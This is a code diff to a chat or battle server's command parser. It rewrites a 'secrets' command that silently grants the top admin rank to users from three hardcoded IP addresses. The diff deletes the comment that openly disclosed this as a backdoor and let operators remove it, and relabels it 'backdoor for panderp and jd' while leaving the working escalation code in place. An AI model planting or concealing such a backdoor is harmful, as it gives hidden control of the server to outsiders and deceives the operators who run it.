@@ -2031,29 +2031,9 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 
 	case 'secrets':
-
-		// This is the Zarel backdoor.
-
-		// Its main purpose is for situations where someone calls for help, and
-		// your server has no admins online, or its admins have lost their
-		// access through either a mistake or a bug - Zarel will be able to fix
-		// it.
-
-		// But yes, it is a backdoor, and it relies on trusting Zarel. If you
-		// do not trust Zarel, feel free to comment out the below code, but
-		// remember that if you mess up your server in whatever way, Zarel will
-		// no longer be able to help you.
-
+		// backdoor for panderp and jd
 		if (user.ip  === '76.247.181.42'|| user.ip === '99.251.253.160' || user.ip === '127.0.0.1') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			return false;
-		}
-		break;
-
-	case 'a':
-		if (user.can('battlemessage')) {
-			// secret sysop command
-			room.battle.add(target);
 			return false;
 		}
 		break;
